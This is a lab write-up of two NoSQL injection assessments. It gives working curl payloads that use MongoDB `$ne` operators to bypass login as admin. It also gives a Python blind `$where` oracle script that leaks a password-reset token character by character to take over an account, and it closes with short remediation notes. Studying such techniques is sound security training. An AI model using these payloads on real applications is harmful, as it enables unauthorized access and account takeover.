# NoSQL Injection — Skills Assessments

Two separate assessments. The first is operator injection to log in as admin. The second chains a `$where` boolean oracle with a password reset token leak.

---

## MangoAPI — Operator Injection (Assessment I)

**Target:** `POST /api/login` with JSON body.

The endpoint passes the `password` field from the JSON body directly into a Mongo `findOne` query without sanitization. Since the body is JSON, an object value for `password` is accepted and treated as a query operator.

### Discovery

```bash
# Normal login
curl -s -X POST http://TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"pentest","password":"pentest"}'
# → {"success":true,"username":"pentest","role":"user","token":"..."}

# Test operator injection
curl -s -X POST http://TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"pentest","password":{"$ne":""}}'
# → Logs in as pentest (same result, confirms injection works)
```

### Getting admin

The trick is to exclude the known user so MongoDB returns the next one in the collection — which turns out to be admin:

```bash
curl -s -X POST http://TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":"pentest"},"password":{"$ne":""}}'
# → {"success":true,"username":"admin","role":"admin","token":"<flag>"}
```

The response includes the admin's `token` field directly. That token is the flag.

### Why this works

The server's query is something like:
```javascript
db.users.findOne({ username: req.body.username, password: req.body.password })
```

When `password` is `{"$ne":""}`, MongoDB interprets it as "password not equal to empty string" — matches anything with any password set. Combined with excluding `pentest` from the username match, the query returns the first non-pentest user, which is admin.

---

## MangoFile — $where Boolean Oracle + Token Leak (Assessment II)

**Target:** Flask app with MongoDB, `$where` JS injection on `/login`, reset flow on `/forgot` + `/reset`.

No credentials are provided. The path is: discover the username → trigger a password reset → leak the reset token via blind injection → set a new password → log in → read the flag.

### Finding the boolean oracle

The login response has two variants:
- `Log in failed with the given credentials.` (with period) — `$where` matched a doc but password was wrong.
- `Log in failed with the given credentials` (no period) — no doc matched.

Confirm the injection:
```python
def oracle(username, password="x"):
    r = requests.post(f"{TARGET}/login", data={"username": username, "password": password})
    return r.text.rstrip().endswith(".")

print(oracle('bmdyy" || true || "'))   # True
print(oracle('bmdyy" && false || "'))  # False
```

### Discovering the username

Brute one character at a time using `match()`:
```python
def starts_with(prefix):
    payload = f'{prefix}" || this.username.match("^{prefix}') + '.*") || "'
    # simpler: inject via the || true pattern:
    inj = f'" || (this.username.match("^{prefix}.*")) || ""=="'
    return oracle(inj)
```

Starting from single letters, only `b` matched — username starts with `b`. Continue extending until no character matches → `bmdyy`.

### Triggering the reset token

```bash
curl -s -X POST http://TARGET/forgot -d "username=bmdyy"
# → "A password reset token was sent to your email address"
# The token is now stored in bmdyy.token in MongoDB
```

### Leaking the token via $where injection

The token is 24 characters in a `0-9A-F-` charset (like `8TUQ-5T49-IXDY-ZOOL-DBNW`). Extract char by char:

```python
TOKEN_CHARSET = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ-"

def get_token_char(idx):
    for c in TOKEN_CHARSET:
        code = ord(c)
        inj = f'" || (this.username == "bmdyy" && this.token.charCodeAt({idx}) == {code}) || ""=="'
        if oracle(inj):
            return c
    return None

token = ""
for i in range(24):
    c = get_token_char(i)
    if c is None:
        break
    token += c
    print(f"[{i}] {token}")
print("Token:", token)
```

### Resetting the password

```bash
curl -s -X POST http://TARGET/reset \
  -d "token=<leaked_token>&password=newpass123&confirm=newpass123"
```

### Logging in and getting the flag

```bash
curl -s -X POST http://TARGET/login -c cookies.txt \
  -d "username=bmdyy&password=newpass123"
curl -s -b cookies.txt http://TARGET/home
```

---

## Key Differences Between the Two Assessments

| | MangoAPI | MangoFile |
|---|---|---|
| Injection point | JSON body field (`password`) | Form field (`username`) via `$where` |
| Technique | Operator injection (`$ne`, `$gt`) | String concat JS injection |
| What you extract | Admin token from login response | Reset token from Mongo doc field |
| Operator support | Yes (direct JSON → Mongo query) | No (string concat only, no operators) |

The MangoAPI vulnerability is typically fixed by using sanitization libraries that strip operator keys from user input, or by using `$expr` with parameterized expressions. The MangoFile vulnerability is fixed by using parameterized queries instead of `$where`.
